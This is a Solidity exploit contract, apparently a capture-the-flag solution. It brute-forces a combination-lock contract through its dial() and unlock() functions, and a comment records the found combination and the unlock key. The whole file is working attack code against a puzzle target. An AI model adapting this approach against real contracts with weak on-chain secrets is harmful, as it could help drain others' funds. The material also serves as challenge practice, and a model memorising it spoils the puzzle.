pragma solidity ^0.8.11;
interface ICombination {
    function dial(uint8 _rotateVal, bool _direction) external;
    function unlock(uint8 _key) external;
}

contract Exploit {
    ICombination combination;

    constructor(ICombination _combination) payable {
        combination = _combination;
    }

    // Brute force FTW.
    // Magic combination was:
    //      7 right
    //      7 left
    //      1 right
    function attack() public {
        for (uint i = 1469; i < 1470; ++i) {
            uint x = i % 14;
            uint y = (i / 14) % 14;
            uint z = (i / (14**2)) % 14;

            uint val1 = x % 7;
            bool dir1 = x >= 7;
            uint val2 = y % 7;
            bool dir2 = y >= 7;
            uint val3 = z % 7;
            bool dir3 = z >= 7;

            combination.dial(uint8(val1 + 1), dir1);
            combination.dial(uint8(val2 + 1), dir2);
            combination.dial(uint8(val3 + 1), dir3);

            // if (combination.isSolved()) {
                combination.unlock(75);
                // break;
            // }

            // combination.reset();
        }
    }

    receive() external payable {}
}